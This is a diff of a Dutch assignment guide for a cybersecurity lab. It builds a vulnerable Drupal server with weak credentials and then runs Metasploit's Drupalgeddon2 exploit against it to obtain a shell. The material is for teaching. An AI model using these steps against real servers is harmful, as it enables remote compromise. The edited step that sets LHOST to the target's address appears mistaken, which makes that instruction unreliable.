@@ -50,7 +50,6 @@ Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023
 - Installeer de mysql repository en selecteer in de prompt `debian buster` en en `mysql-5.7` als versie van mysql:
 
   ```bash
-    #sudo apt-get install lsb-release gnupg
     wget https://dev.mysql.com/get/mysql-apt-config_0.8.18-1_all.deb
     sudo dpkg -i mysql-apt-config_0.8.18-1_all.deb
   ```
@@ -60,34 +59,39 @@ Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023
   ```bash
     wget https://jobbe.be/csv-npe-2223/drupal-install.sh
     chmod +x drupal-install.sh
-    ./drupal-install.sh
+    sudo ./drupal-install.sh
   ```
 
-##TODO: rest modules downloaden
-
-- Kies in de prompt voor debian buster (10) en mysql-5.7 als versie van mysql
-- Na de installatie is drupal beschikbaar op `http://localhost:index.php`
+- Na de installatie is drupal beschikbaar op `http://localhost/index.php`
 - Configureer Drupal met de volgende gegevens:
 
   - Database name: `drupal`
   - Database username: `drupal`
-  - Database password: `drupal`
-  - Database host: `localhost`
-  - Database port: `3306`
-  - Database driver: `mysql`
-  - Database prefix: `drupal_`
+  - Database password: `password`
   - Site name: `drupal`
-  - Site email address: `drupal@localhost`
+  - Site email address: `drupal@localhost.be`
   - Username: `drupal`
   - Password: `drupal`
   - Default country: `Belgium`
   - Default timezone: `Europe/Brussels`
 
-- Activeer de module `RESTful Web Services` in de `Extend` pagina van Drupal
 - Verwijder de standaard web pagina in /var/www/html:
 
   ```bash
-    sudo rm -rf /var/www/html/index.html
+    sudo rm -rf /var/www/CybersecurityNPE2023.local/index.html
+  ```
+
+- Activeer de volgende modules onderaan in de `Modules` pagina van Drupal:
+
+  - `Entity API`
+  - `RESTful Web Services`
+
+- Deactiveer de enp0s3 netwerk adapter en activeer de enp0s8 netwerk adapter in de instellingen van de Debian VM
+
+- Check het ip-adres van de Debian VM met het volgende commando:
+
+  ```bash
+    ip a
   ```
 
 ## 3. Metesploit
@@ -99,6 +103,8 @@ Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023
   - Username: `osboxes`
   - Password: `osboxes.org`
 
+- Deactiveer de enp0s3 netwerk adapter en activeer de enp0s8 netwerk adapter in de instellingen van de Kali VMs
+
 - Open een terminal en voer volgende commando's uit:
 
   ```bash
@@ -106,11 +112,11 @@ Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023
     sudo msfconsole
   ```
 
-- Voer volgende commando's uit in de metasploit console om de remote host te in te stellen:
+- Voer volgende commando's uit in de metasploit console om de host te in te stellen (vervang xxx.xxx.xxx.xxx met het ip-adres van de Debian VM):
 
   ```bash
     use exploit/unix/webapp/drupal_drupalgeddon2
-    set RHOSTS 192.168.56.x
+    set LHOST xxx.xxx.xxx.xxx
     set VERBOSE true
     check
   ```
@@ -124,6 +130,6 @@ Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023
 - Als de exploit succesvol is uitgevoerd, kan je een shell openen met volgende commando's:
 
   ```bash
-    sessions -i 1
     whoami
+    ls
   ```
